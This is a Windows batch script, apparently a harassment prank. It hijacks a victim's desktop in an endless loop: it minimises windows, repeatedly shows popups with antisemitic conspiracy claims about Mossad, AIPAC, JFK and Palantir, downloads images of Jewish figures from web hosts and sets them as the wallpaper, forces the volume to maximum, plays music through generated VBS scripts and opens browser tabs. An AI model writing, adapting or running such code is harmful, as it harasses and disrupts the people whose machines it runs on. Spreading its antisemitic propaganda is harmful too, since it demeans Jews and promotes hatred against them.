@echo off
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
set "site=https://www.sefaria.org/Tanya%%2C_Part_I%%3B_Likkutei_Amarim%%2C_Title_Page.5?lang=bi"
set "audioUrl=https://archive.org/download/havanagilasoundr00inte/01_Hava_nagila.mp3"

:: Background Image URLs
set "img4=https://en.idi.org.il/media/20424/bibi-the-first-and-bibi-the-second.jpg"
set "img2=https://s.wsj.net/public/resources/images/BN-TN907_wester_GR_20170522122121.jpg"
set "img3=https://cdn.britannica.com/51/277851-050-A300524C/Hasidic-Jewish-Men-shabbat-Williamsburg-Brooklyn-New-York.jpg"
set "img1=https://cdn.theatlantic.com/thumbor/pt5NSF1QJLOHVIT5ifaO0wE67ys=/0x0:2000x1125/960x540/media/img/mt/2026/03/2026_03_01_netanyahu-1/original.jpg"

:: Spam Message List
set "msg0=Assasintating the last true american president (JFK) after he wanted to inspect Israli nuclear power plants, force AIPAC to register as a foreign lobby, and questioned why the US was funding Israel..."
set "msg1=Mossad/AIPAC/Israel $271,000 (not $6,000,000) donation processing..."
set "msg2=Enslaving US Goverment to Israel (via AIPAC)..."
set "msg3=Using PALANTIR drones to spray meth spiked urine on anti-semites..."

:: 1. START THE SPAMMER

timeout /t 9 >nul
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg0%', 10, 'Mossad Assasination Department', 48) }"

timeout /t 12 >nul
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg3%', 10, 'Message from Alex Karp', 0) }"


timeout /t 8 >nul
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg2%', 10, 'Goverment Lobying Program', 32) }"

timeout /t 7 >nul
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg1%', 10, 'Elections Rigging Software', 0) }"

timeout /t 10 >nul
:: 2. MAIN CYCLE
set /a count=1

:maincycle
if !count! equ 1 set "currentImg=%img1%"
if !count! equ 2 set "currentImg=%img2%"
if !count! equ 3 set "currentImg=%img3%"
if !count! equ 4 set "currentImg=%img4%"

powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"

echo [Action] Updating Wallpaper...
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%currentImg%', '%TEMP%\wallpaper.jpg')"
powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"


:: 2a. MAXIMIZE SYSTEM MASTER VOLUME
::echo [Action] Setting system volume...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; for($i=0; $i -lt 5; $i++) { $wsh.SendKeys([char]174) }; for($i=0; $i -lt 10; $i++) { $wsh.SendKeys([char]175) }"



:: 2b. Play Audio (Logic updated to avoid <> error)
echo [Action] Playing Music...
(
echo Set Player = CreateObject("WMPlayer.OCX"^)
echo Player.settings.volume = 100
echo Player.URL = "%audioUrl%"
echo Player.Controls.Play
echo Do Until Player.playState = 1
echo Wscript.Sleep 100
echo Loop
) > "%TEMP%\play.vbs"

start /min wscript.exe "%TEMP%\play.vbs"

powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
:: 2c. Create the VBS Red X Box
(
echo Set WshShell = CreateObject("WScript.Shell"^)
powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('Anti-Semetic thoughts detected. Initialising PALANTIR goyim destruction sequence...', 10, 'PALANTIR', 16) }"
echo WshShell.Run "cmd /c start %site%"
) > "%TEMP%\alert.vbs"

cscript //nologo "%TEMP%\alert.vbs"

start "" "https://www.sefaria.org/Gittin.57a.4?lang=bi&with=all&lang2=en"

:: Increment and loop
set /a count+=1
if !count! gtr 4 set /a count=1
echo [Status] Cycle complete. Waiting 35 seconds...
timeout /t 30 /nobreak >nul



goto maincycle
